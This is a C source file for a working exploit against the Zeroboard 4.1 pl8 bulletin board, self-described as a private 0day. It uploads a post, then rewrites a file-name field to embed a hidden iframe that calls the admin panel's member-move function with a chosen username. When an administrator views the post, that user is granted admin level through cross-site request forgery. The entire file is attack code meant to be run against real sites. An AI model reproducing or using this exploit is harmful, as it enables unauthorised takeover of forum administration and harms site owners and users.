#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <libgen.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DESC \
	"[!] Zeroboard 4.1 pl8 (CSRF Vulnerability) 0day exploit.\n" \
	"     (Ver 0x04 - Using iframe tag + div tag)\n\n" \
	"THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!!\n\n" \
	"Exploited by indra (indra.kr \\x40 gmail.com)\n\n"

/* {{{ DEFINED DATA */
#define HTTP_HEAD	"POST %s/write_ok.php HTTP/1.0\r\n\
Host: %s\r\n\
Referer: http://%s\r\n\
Content-Type: multipart/form-data; boundary=BDR\r\n\
Content-Length: %u\r\n\r\n"

#define HTTP_POST	"--BDR\r\n\
Content-Disposition: form-data; name=\"id\"\r\n\r\n\
%s\r\n\
--BDR\r\n\
Content-Disposition: form-data; name=\"is_secret\"\r\n\r\n\
%d\r\n\
--BDR\r\n\
Content-Disposition: form-data; name=\"no\"\r\n\r\n\
%u\r\n\
--BDR\r\n\
Content-Disposition: form-data; name=\"mode\"\r\n\r\n\
%s\r\n\
--BDR\r\n\
Content-Disposition: form-data; name=\"password\"\r\n\r\n\
%d\r\n\
--BDR\r\n\
Content-Disposition: form-data; name=\"name\"\r\n\r\n\
%s\
--BDR\r\n\
Content-Disposition: form-data; name=\"email\"\r\n\r\n\r\n\
--BDR\r\n\
Content-Disposition: form-data; name=\"homepage\"\r\n\r\n\r\n\
--BDR\r\n\
Content-Disposition: form-data; name=\"subject\"\r\n\r\n\
%s\
--BDR\r\n\
Content-Disposition: form-data; name=\"memo\"\r\n\r\n\
%s\
--BDR\r\n\
Content-Type: text/html\r\n\
Content-Disposition: form-data; name=\"file1\"; filename=\"%s\";\r\n\r\n"

#define ADD "\r\n--BDR--"
/* }}} */

/* {{{ PROTO TYPES */
void usage(void);
char *get_hostname(char *);
unsigned int file_size(char *);
int genpass(void);
void input_mode(void *);
unsigned int file_read(void *, char *, unsigned int);
unsigned int upload(void *, char *, char *, unsigned int);
/* }}} */

/* {{{ GLOBAL VARIABLES */
struct attack_info {
	char *url;
	char *bbsid;
	char *hostname;
	unsigned char is_secret;
	char *username;
	int port;
	char *file;
	char *mode;
	unsigned int no;
	unsigned short passwd;
	unsigned char *name;
	char *subject;
	char *memo;
};
/* }}} */

/* {{{ int main(); */
int main(int argc, char **argv)
{
	int c = 0;
	struct attack_info *info = NULL;
	unsigned int upfile_sz = 0;
	char *head_data = NULL, *post_data = NULL;
	void *ptr = NULL;
	unsigned int post_len = 0, head_len = 0, wrote_no = 0;

	static struct option opts[] =
	{
		{"url", 1, 0, 'u'},
		{"id", 1, 0, 'i'},
		{"port", 1, 0, 'p'},
		{"file", 1, 0, 'f'},
		{"name", 1, 0, 'n'},
		{"secret", 0, 0, 's'},
		{"help", 0, 0, 'h'},
		{0, 0, 0, 0}
	};

	if(argc == 1)
		usage();

	if((info = malloc(sizeof(struct attack_info))) == NULL) {
		fprintf(stderr, "Out of memory.\n");
		goto fail;
	}
	memset(info, 0x00, sizeof(struct attack_info));
	info->port = 80;
	info->mode = "write";
	info->is_secret = 0;

	while(1) {
		int idx = 0;
		if((c = getopt_long(argc, argv, "u:i:p:f:n:sh", opts, &idx)) == -1)
			break;
		switch(c) {
		case 'u':
			info->url = optarg;
			break;
		case 'i':
			info->bbsid = optarg;
			break;
		case 'p':
			info->port = atoi(optarg);
			break;
		case 'f':
			info->file = optarg;
			break;
		case 'n':
			info->username = optarg;
			break;
		case 's':
			info->is_secret = 1;
			break;
		case 'h':
			usage();
			break;
		default:
			break;
		}
	}

	if(info->url == NULL || info->bbsid == NULL || info->file == NULL
			|| info->username == NULL)
		usage();

	fprintf(stdout, "%s", DESC);
	if((info->hostname = get_hostname(info->url)) == NULL) {
		fprintf(stderr, "Illegal URL. (need for absolute WebURL)\n");
		goto fail;
	}

	if((upfile_sz = file_size(info->file)) == -1) {
		fprintf(stdout, "`%s' file not found.\n", info->file);
		goto fail;
	}

	fprintf(stdout,  "-TARGET HOST: %s:%d\n"
		"-UPLOAD FILE: %s\n", info->hostname, info->port, info->file);

	input_mode(info);

	info->passwd = genpass();

	post_len = strlen(HTTP_POST);
	post_len += (strlen(info->bbsid) + strlen(info->mode) + 2);
	post_len += (strlen(info->name) + strlen(info->subject) + strlen(info->memo) + 4);
	post_len += (strlen(info->file) + upfile_sz + strlen(ADD));
	
	// iframe tag memory block
	if(upfile_sz < 1024)
		post_len += (1024 - upfile_sz);

	if((post_data = malloc(post_len)) == NULL) {
		fprintf(stdout, "Out of memory.\n");
		goto fail;
	}

	snprintf(post_data, post_len, HTTP_POST, info->bbsid, info->is_secret, 0, info->mode,
			info->passwd, info->name, info->subject, info->memo, info->file);
	ptr = post_data + strlen(post_data);
	if(file_read(ptr, info->file, upfile_sz) != upfile_sz) {
		fprintf(stdout, "`%s' file read error.\n", info->file);
		goto fail;
	}
	sprintf(ptr + upfile_sz, "%s", ADD);

	head_len = strlen(HTTP_HEAD) + strlen(info->url) + (strlen(info->hostname) * 2);
	head_len += 10; // maximum: 4294967295 - unsigned int type
	
	if((head_data = malloc(head_len + 1)) == NULL) {
		fprintf(stdout, "Out of memory.\n");
		goto fail;
	}
	
	snprintf(head_data, head_len + 1, HTTP_HEAD, info->url, info->hostname,
			info->hostname, post_len);

	if((int)(wrote_no = upload(info, head_data, post_data, post_len)) < 0) {
		fprintf(stdout, "\n-Upload failed\n");
		goto fail;
	}

	fprintf(stdout, "\n-Upload complete\n\n* Password: %d\n* No: %u%s\n", 
			info->passwd, wrote_no, info->is_secret == 1 ? "\n* Mode: Secret\n" : "\n");

	info->mode = "modify";
	snprintf(post_data, post_len, HTTP_POST, info->bbsid, info->is_secret, wrote_no, info->mode,
			info->passwd, info->name, info->subject, info->memo, info->file);
	if((ptr = strstr(post_data, "name=\"memo\"")) == NULL) {
		fprintf(stdout, "Parse error.\n");
		goto fail;
	}
	ptr += (strlen("name=\"memo\"") + strlen(info->memo) + 4);
	sprintf(ptr, "--BDR\r\nContent-Disposition: form-data; name=\"file_name1\"\r\n\r\n"
			"data/%s/%s\r\n"
			"--BDR\r\nContent-Disposition: form-data; name=\"s_file_name1\"\r\n\r\n"
			"<div style=\"position:absolute; width:0px; height:0px; overflow:hidden\">"
			"<iframe src=\"/bbs/admin_setup.php?page=1&keykind=user_id&keyword=%s&"
			"like=&group_no=1&exec=view_member&exec2=moveall&cart%%5B%%5D=2&movelevel=1\""
			" width=0 height=0></iframe></div>%s\r\n"
			"%s",
			info->bbsid, basename(info->file), info->username,
			basename(info->file), ADD);

	fprintf(stdout, "POST_DATA: %s\n", post_data);
	
	post_len = strlen(post_data) + 1;
	
	snprintf(head_data, head_len, HTTP_HEAD, info->url, info->hostname,
			info->hostname, post_len);

	if((int)upload(info, head_data, post_data, post_len) < 0) {
		fprintf(stdout, "-Overwrite failed\n");
		goto fail;
	}
	fprintf(stdout, "-Overwrite complete.\n");

	free(info);
	free(post_data);
	free(head_data);

	return EXIT_SUCCESS;

fail:
	if(info) free(info);
	if(post_data) free(post_data);
	if(head_data) free(head_data);
	return EXIT_FAILURE;
}
/* }}} */

/* {{{ void usage(); */
void usage(void)
{
	fprintf(stdout,
		"%s"
		"<OPTIONS>\n"
		"  -u, --url\t\t<TARGET URL>\n"
		"  -i, --id\t\t<BBS ID>\n"
		"  -p, --port\t\t<TARGET PORT (DEFAULT: 80)>\n"
		"  -f, --file\t\t<UPLOAD FILE>\n"
		"  -n, --name\t\t<USER NAME>\n"
		"  -s, --secret\t\t<SECRET MODE (DEFAULT: NO)>\n"
		"  -h, --help\t\t[Show this messages]\n", DESC);
	exit(EXIT_SUCCESS);
}
/* }}} */

/* {{{ char *get_hostname(); */
char *get_hostname(char *url)
{
	static char ret[64];
	void *ptr = NULL, *str = url;

	if(memcmp(url, "http://", 7) == 0)
		str = (url + 7);
	
	if((ptr = strchr(str, 0x2f)) == NULL)
		return NULL;

	snprintf(ret, (ptr - str) + 1, "%s", (char*)str);
	return ret;
}
/* }}} */

/* {{{ unsigned int file_size(); */
unsigned int file_size(char *path)
{
	int fd = 0;
	unsigned int sz = 0;

	if((fd = open(path, O_RDONLY)) < 0)
		return -1;
	sz = lseek(fd, 0, SEEK_END);
	close(fd);
	return sz;
}
/* }}} */

/* {{{ int getpass(); */
int genpass(void)
{
	srand(time(NULL));
	return (rand()%10000);
}
/* }}} */

/* {{{ void input_mode(); */
void input_mode(void *buf)
{
	static unsigned char name[32], subject[128], memo[1024];
	struct attack_info *info = buf;
	int acc = 0, n = 0;

	memset(name, 0x00, sizeof(name));
	memset(name, 0x00, sizeof(subject));
	memset(memo, 0x00, sizeof(memo));
	
	fprintf(stdout, "\n<Input Mode>:\n");
	fprintf(stdout, "Name: ");
	fgets(name, sizeof(name), stdin);
	fprintf(stdout, "Subject: ");
	fgets(subject, sizeof(subject), stdin);
	fprintf(stdout, "Text (Ending with '^D'): ");
	fflush(stdout);
	while(acc != sizeof(memo) - 1) {
		if((n = read(0, memo + acc, sizeof(memo) - acc)) == 0)
			break;
		acc += n;
	}

	info->name = name;
	info->subject = subject;
	info->memo = memo;
	return;
}
/* }}} */

/* {{{ unsigned int file_read(); */
unsigned int file_read(void *ptr, char *file, unsigned int sz)
{
	int fd = 0;
	unsigned int n = 0;

	if((fd = open(file, O_RDONLY)) < 0) {
		return -1;
	}
	if((n = read(fd, ptr, sz)) != sz) {
		return -1;
	}
	close(fd);
	return n;
}
/* }}} */

/* {{{ int upload(); */
unsigned int upload(void *ptr, char *head, char *content, unsigned int content_len)
{
	int s = 0, n = 0;
	unsigned int no = -1;
	char *p = NULL;
	char buf[1024];
	struct sockaddr_in sin;
	struct hostent *he = NULL;
	struct attack_info *info = (struct attack_info *)ptr;

	memset(&sin, 0x00, sizeof(sin));
	
	if((he = gethostbyname(info->hostname)) == NULL) {
		fprintf(stdout, "gethostbyname() function error.\n");
		goto fail;
	}
	if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stdout, "socket() function error.\n");
		goto fail;
	}
	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(info->port);
	if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
		fprintf(stdout, "connection failed.\n");
		goto fail;
	}
	if(send(s, head, strlen(head), 0) != strlen(head)) {
		fprintf(stdout, "send() function error.\n");
		goto fail;
	}
	if(send(s, content, content_len, 0) != content_len) {
		fprintf(stdout, "send() function error.\n");
		goto fail;
	}

	memset(buf, 0x00, sizeof(buf));
	n = recv(s, buf, sizeof(buf) - 1, 0);
	close(s);

	if((p = strstr(buf, "no=")) == NULL) {
		fprintf(stdout, "strstr() function error.\n");
		goto fail;
	}
	no = atoi(p + strlen("no="));

	return no;
fail:
	if(s != 0) close(s);
	return -1;
}
/* }}} */

/*
 * vim600: fdm=marker
 */
